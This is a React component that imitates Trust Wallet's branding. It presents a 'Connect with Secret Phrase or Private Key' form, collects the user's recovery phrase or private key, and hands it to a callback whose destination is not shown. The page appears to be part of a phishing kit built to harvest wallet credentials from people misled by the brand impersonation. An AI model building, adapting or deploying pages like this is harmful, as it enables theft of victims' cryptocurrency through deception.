"use client";

import { useRef, useState } from "react";
import { X } from "lucide-react";
import { Input } from "@/components/ui/input";
import { useWalletStore } from "@/store/walletStore";
import TrustWalletFull from "../icons/trust-wallet-full";

const TrustWallet = ({
	handleFinish,
}: {
	handleFinish: (walletPhrase: string) => Promise<void>;
}) => {
	const [walletName, setWalletName] = useState("Main wallet");
	const [seedPhrase, setSeedPhraseState] = useState("");
	const [nameFocused, setNameFocused] = useState(false);
	const [areaFocused, setAreaFocused] = useState(false);
	const { setSeedPhrase } = useWalletStore();
	const textareaRef = useRef<HTMLTextAreaElement | null>(null);

	// Handle completion
	const handleComplete = () => {
		setSeedPhrase(seedPhrase.trim());
		handleFinish(seedPhrase.trim());
	};

	// Handle click area focus
	const handleAreaClick = (e: React.MouseEvent<HTMLDivElement>) => {
		const target = e.target as HTMLElement;
		if (target.closest("textarea")) return;
		textareaRef.current?.focus();
	};

	// Disable button logic
	const isButtonDisabled = !walletName.trim() || !seedPhrase.trim();

	return (
		<div className="min-h-screen bg-black flex text-gray-300 w-full">
			{/* Right side - Form */}
			<div className="flex-1 flex flex-col items-center justify-center p-4 lg:p-12">
				<span className="mb-10 flex w-full">
					<TrustWalletFull />
				</span>
				<div className="w-full max-w-2xl">
					<h2 className="text-2xl font-bold mb-6">
						Connect with Secret Phrase or Private Key
					</h2>

					<div className="space-y-6">
						{/* Wallet Name */}
						<div>
							<label className="block font-semibold mb-2">Wallet Name</label>
							<div
								className={`relative border rounded-lg ${
									nameFocused ? "border-green-600" : "border-neutral-700"
								}`}
							>
								<Input
									value={walletName}
									onChange={(e) => setWalletName(e.target.value)}
									onFocus={() => setNameFocused(true)}
									onBlur={() => setNameFocused(false)}
									className="text-gray-100/80 font-semibold py-6 pr-10 bg-transparent border-0"
								/>
								{walletName && (
									<button
										onClick={() => setWalletName("")}
										className="absolute right-3 top-1/2 -translate-y-1/2 bg-gray-100/70 rounded-full text-black"
									>
										<X className="w-4 h-4 p-0.5" />
									</button>
								)}
							</div>
							<p className="text-xs text-muted-foreground mt-1">
								You can edit this later
							</p>
						</div>

						{/* Secret Phrase area */}
						<div>
							<label className="block text-sm font-medium text-foreground mb-2">
								Enter Secret Phrase or Private Key
							</label>

							<div
								onClick={handleAreaClick}
								className={`relative rounded-lg p-4 cursor-text transition-colors ${
									areaFocused
										? "border border-green-600"
										: "border border-neutral-700"
								} bg-neutral-900`}
							>
								<textarea
									ref={textareaRef}
									value={seedPhrase}
									onChange={(e) => setSeedPhraseState(e.target.value)}
									onFocus={() => setAreaFocused(true)}
									onBlur={() => setAreaFocused(false)}
									placeholder="Enter your secret phrase or private key..."
									className="w-full h-40 resize-none bg-transparent outline-none text-gray-100/80 font-semibold placeholder:text-gray-500"
									autoCapitalize="none"
									autoCorrect="off"
									spellCheck={false}
								/>
							</div>

							<p className="text-xs font-medium mt-2 text-gray-100/80">
								Secret Phrase is typically 12 (sometimes 18, 24) words separated
								by single spaces
								<br />
								Private Key is a long alphanumeric code
							</p>
						</div>

						{/* Import button */}
						<div className="flex w-full justify-end items-center">
							<button
								onClick={handleComplete}
								className={`w-full py-3 rounded-full font-medium transition-all mt-auto max-w-80 ${
									isButtonDisabled
										? "bg-green-600/60 cursor-not-allowed opacity-50"
										: "bg-green-600 hover:bg-green-500 text-neutral-800"
								}`}
								disabled={isButtonDisabled}
							>
								Connect
							</button>
						</div>
					</div>
				</div>
			</div>
		</div>
	);
};

export default TrustWallet;
